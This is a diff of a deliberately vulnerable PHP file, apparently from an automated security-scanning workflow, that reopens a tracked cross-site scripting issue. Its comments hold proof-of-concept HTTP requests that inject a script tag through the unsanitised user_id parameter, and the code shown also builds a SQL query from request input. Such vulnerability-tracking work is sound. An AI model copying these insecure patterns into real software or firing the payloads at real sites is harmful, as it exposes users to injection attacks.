@@ -1,9 +1,9 @@
 <?php
 $id = htmlspecialchars(mysql_real_escape_string($_REQUEST['id']));
 $user_id = $_REQUEST['user_id'];
-//VERIFY: AI XSS issue #155, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/155, ad2a0e0b
+//REOPEN: AI XSS issue #155, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/155, ad2a0e0b
 //AI exploit:
-//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-c2ef4b4/vulnerable.php?user_id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-1f6ea6d/vulnerable.php?user_id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
 //Host: localhost
 //Accept-Encoding: identity
 //Connection: close
@@ -18,9 +18,9 @@ if(isset($id) && isset($user_id))
 	//Connection: close
 	$res = mysql_query("SELECT * FROM messages WHERE msg_id = '$id'") or die(mysql_error());
 	$res = mysql_fetch_assoc($res);
-	//VERIFY: AI XSS issue #155, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/155, 05f7e6a3
+	//REOPEN: AI XSS issue #155, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/155, 05f7e6a3
 	//AI exploit:
-	//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-c2ef4b4/vulnerable.php?user_id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&id=1 HTTP/1.1
+	//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-1f6ea6d/vulnerable.php?user_id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
 	//Host: localhost
 	//Accept-Encoding: identity
 	//Connection: close
